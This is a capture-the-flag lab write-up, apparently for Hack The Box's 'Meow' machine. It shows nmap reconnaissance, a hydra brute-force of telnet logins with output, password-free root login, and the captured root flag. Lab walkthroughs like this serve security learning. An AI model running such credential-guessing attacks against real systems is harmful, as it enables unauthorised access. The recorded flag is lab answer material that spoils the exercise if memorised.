# Target: Meow Lab 10.129.97.216 (Hostname: target.htb)

## Scope & Goal
- Objective: user.txt, root.txt
- Constraints: lab

# Recon
- Quick TCP: nmap target.htb
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 13:21 -0400
Nmap scan report for target.htb (10.129.97.216)
Host is up (0.061s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
23/tcp open  telnet

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds

- Targeted Scan: nmap target.htb -sV -sC -A -p23 -vv
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-08 13:23 -0400
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.01s elapsed
Initiating Ping Scan at 13:23
Scanning target.htb (10.129.97.216) [4 ports]
Completed Ping Scan at 13:23, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 13:23
Scanning target.htb (10.129.97.216) [1 port]
Discovered open port 23/tcp on 10.129.97.216
Completed SYN Stealth Scan at 13:23, 0.08s elapsed (1 total ports)
Initiating Service scan at 13:23
Scanning 1 service on target.htb (10.129.97.216)
Completed Service scan at 13:23, 10.20s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against target.htb (10.129.97.216)
Initiating Traceroute at 13:23
Completed Traceroute at 13:23, 0.06s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:23
Completed Parallel DNS resolution of 1 host. at 13:23, 0.50s elapsed
NSE: Script scanning 10.129.97.216.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 10.18s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.01s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.01s elapsed
Nmap scan report for target.htb (10.129.97.216)
Host is up, received reset ttl 63 (0.059s latency).
Scanned at 2026-04-08 13:23:11 EDT for 23s

PORT   STATE SERVICE REASON         VERSION
23/tcp open  telnet  syn-ack ttl 63 Linux telnetd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=4/8%OT=23%CT=%CU=39017%PV=Y%DS=2%DC=T%G=N%TM=69D68F16%
OS:P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=110%TI=Z%CI=Z%II=I%TS=A)OPS(O
OS:1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11N
OS:W7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R
OS:=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%
OS:RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y
OS:%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=
OS:40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S
OS:)

Uptime guess: 6.024 days (since Thu Apr  2 12:48:42 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   59.44 ms 10.10.14.1
2   60.05 ms target.htb (10.129.97.216)

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:23
Completed NSE at 13:23, 0.01s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.47 seconds
           Raw packets sent: 40 (2.594KB) | Rcvd: 204 (8.898KB)


- Full TCP: Same as Targeted Scan

## Open Services
- 23/telnet

## Telnet Enum
- Tech: Linux telnetd
- Banner: Trying 10.129.97.216...
Connected to target.htb.
Escape character is '^]'.
  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: 

- Enumeration: I don't have a username or password. I will have hydra guess for me.

hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-08 13:43:01
[WARNING] telnet is by its nature unreliable to analyze, if possible better choose FTP, SSH, etc. if available
[DATA] max 16 tasks per 1 server, overall 16 tasks, 425 login tries (l:17/p:25), ~27 tries per task
[DATA] attacking telnet://target.htb:23/
[23][telnet] host: target.htb   login: root   password: 123123
[23][telnet] host: target.htb   login: root   password: abc123
[23][telnet] host: target.htb   login: root   password: sunshine
[23][telnet] host: target.htb   login: root   password: letmein
[23][telnet] host: target.htb   login: root   password: 1234567
[23][telnet] host: target.htb   login: root   password: trustno1
[23][telnet] host: target.htb   login: root   password: master
[23][telnet] host: target.htb   login: root   password: monkey
[23][telnet] host: target.htb   login: root   password: 111111
[23][telnet] host: target.htb   login: root   password: password
[23][telnet] host: target.htb   login: root   password: iloveyou
[23][telnet] host: target.htb   login: root   password: 12345678
[23][telnet] host: target.htb   login: root   password: 123456
[23][telnet] host: target.htb   login: root   password: dragon
[23][telnet] host: target.htb   login: root   password: querty
[23][telnet] host: target.htb   login: root   password: baseball
[STATUS] 185.00 tries/min, 185 tries in 00:01h, 240 to do in 00:02h, 16 active
1 of 1 target successfully completed, 16 valid passwords found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-08 13:44:50

It appears that the username root will work with any password. So I try that.

## Foothold
- Vector: telnet
- Steps/Commands:

telnet target.htb
Trying 10.129.97.216...
Connected to target.htb.
Escape character is '^]'.

  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 08 Apr 2026 05:44:02 PM UTC

  System load:           1.71
  Usage of /:            41.7% of 7.75GB
  Memory usage:          5%
  Swap usage:            0%
  Processes:             172
  Users logged in:       0
  IPv4 address for eth0: 10.129.97.216
  IPv6 address for eth0: dead:beef::250:56ff:feb0:1a8c

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

75 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Apr  8 17:43:18 UTC 2026 on pts/9

- Evidence:

## Flags
- root.txt b40abdfe23665f766f9c61ecba8a4c19 (Wed 08 Apr 2026 05:48:43 PM UTC)

## Lessons
- What Worked: Nmap scan, hydra
- Dead Ends: Full Nmap scan found nothing that the Target Scan hadn't already found
- Reusable Commands:

hydra -L Usernames/top-usernames-shortlist.txt -P Passwords/Common-Credentials/top-passwords-shortlist.txt target.htb telnet
sudo apt install seclists
